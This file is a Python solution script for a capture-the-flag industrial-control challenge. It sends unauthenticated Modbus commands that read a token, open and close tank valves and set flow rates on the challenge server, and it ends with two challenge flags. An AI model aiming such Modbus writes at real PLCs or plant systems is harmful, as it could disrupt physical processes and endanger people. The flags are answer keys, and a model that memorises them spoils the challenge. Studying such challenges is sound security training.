from pyModbusTCP.client import ModbusClient
import time
import requests

c = ModbusClient(host="challenges.france-cybersecurity-challenge.fr", port=502, auto_open=True)

def read_token():
    token = c.read_holding_registers(0, 32)
    s = s_ = ""
    for i in range(len(token)):
        s = s + chr(token[i])
    print(s)
    return s

def access_scada(token):
    url = "https://color-plant.france-cybersecurity-challenge.fr/" + token
    r = requests.get(url, params=None, proxies=None, allow_redirects=False)

def read_coil(coil):
    coil = c.read_coils(coil, 1)
    assert(coil != None)
    return coil

def write_coil(coil, val):
    coil = c.write_single_coil(coil, val)
    assert(coil != None)
    return coil

def read_hreg(hreg):
    hreg = c.read_holding_registers(hreg, 1)
    assert(hreg != None)
    return hreg

def read_inreg(inreg):
    inreg = c.read_input_registers(inreg, 1)[0]
    assert(inreg != None)
    return inreg

def write_reg(reg, val):
    reg = c.write_single_register(reg, val)
    assert(reg != None)
    return reg

def status_cuve_R():
    return read_coil(0)

def status_cuve_G():
    return read_coil(1)

def status_cuve_B():
    return read_coil(2)

def open_cuve_R():
    return write_coil(0, 1)

def open_cuve_G():
    return write_coil(1, 1)

def open_cuve_B():
    return write_coil(2, 1)

def close_cuve_R():
    return write_coil(0, 0)

def close_cuve_G():
    return write_coil(1, 0)

def close_cuve_B():
    return write_coil(2, 0)

def open_cuve_final():
    return write_coil(3, 1)

def close_cuve_mix():
    return write_coil(3, 0)

def status_cuve_mix():
    # TODO (needed ?)
    return 0

def read_debit_R():
    return read_hreg(32)

def read_debit_G():
    return read_hreg(33)

def read_debit_B():
    return read_hreg(34)

def write_debit_R(debit):
    return write_reg(32, debit)

def write_debit_G(debit):
    return write_reg(33, debit)

def write_debit_B(debit):
    return write_reg(34, debit)

def read_debit_mix():
    return read_hreg(35)

def write_debit_mix(debit):
    return write_reg(35, debit)

def read_cuve_R():
    return read_inreg(0)

def read_cuve_G():
    return read_inreg(1)

def read_cuve_B():
    return read_inreg(2)

def read_mix_R():
    return read_inreg(3)

def read_mix_G():
    return read_inreg(4)

def read_mix_B():
    return read_inreg(5)

def read_mix_total():
    return read_inreg(6)

def read_final_R():
    return read_inreg(7)

def read_final_G():
    return read_inreg(8)

def read_final_B():
    return read_inreg(9)

def read_final_total():
    return read_inreg(10)

def status_M():
    print("M(R)", read_mix_R())
    print("M(G)", read_mix_G())
    print("M(B)", read_mix_B())
    print("M(T)", read_mix_total())

def status_F():
    print("F(R)", read_final_R())
    print("F(G)", read_final_G())
    print("F(B)", read_final_B())
    print("F(T)", read_final_total())

def close_cuve_R_on_quantity(q):
    while 1:
        R = read_mix_R()
        if R == q:
            close_cuve_R()
            break

def close_cuve_G_on_quantity(q):
    while 1:
        G = read_mix_G()
        if G == q:
            close_cuve_G()
            break

def close_cuve_B_on_quantity(q):
    while 1:
        B = read_mix_B()
        if B == q:
            close_cuve_B()
            break

def close_cuve_mix_on_quantity(q):
    while 1:
        B = read_mix_total()
        if B == q:
            close_cuve_mix()
            break

def scada():
    close_cuve_R()
    close_cuve_G()
    close_cuve_B()
    # R: open & adjust rate
    # R: T=4 allows to reach 16u in one step.
    write_debit_R(4)
    open_cuve_R()
    close_cuve_R_on_quantity(16)
    #status_M()
    # G: open & adjust rate
    # G: T=5 up to 60u, then T=1 slowly to reach 63u
    write_debit_G(5)
    open_cuve_G()
    close_cuve_G_on_quantity(60)
    #status_M()
    write_debit_G(1)
    open_cuve_G()
    close_cuve_G_on_quantity(63)
    #status_M()
    # B: open & adjust rate
    # B: T=5 up to 20u, then T=1 slowy to reach 21u
    write_debit_B(5)
    open_cuve_B()
    close_cuve_B_on_quantity(20)
    #status_M()
    write_debit_B(1)
    open_cuve_B()
    close_cuve_B_on_quantity(21)
    status_M()
    # Mix: open & adjust rate
    write_debit_mix(10)
    open_cuve_final()
    close_cuve_mix_on_quantity(0)
    status_M()
    status_F()

token = read_token()
access_scada(token)
scada()
scada()
time.sleep(60)

# FCSC{266350f412840c932b29bb095394d318c17c844f70c05f49c9998a8e614be531}
# FCSC{3518dcd9579b4f2bf4ab32f126aa746e00767d6b130ef6c2e79ae6a313d0ba07}
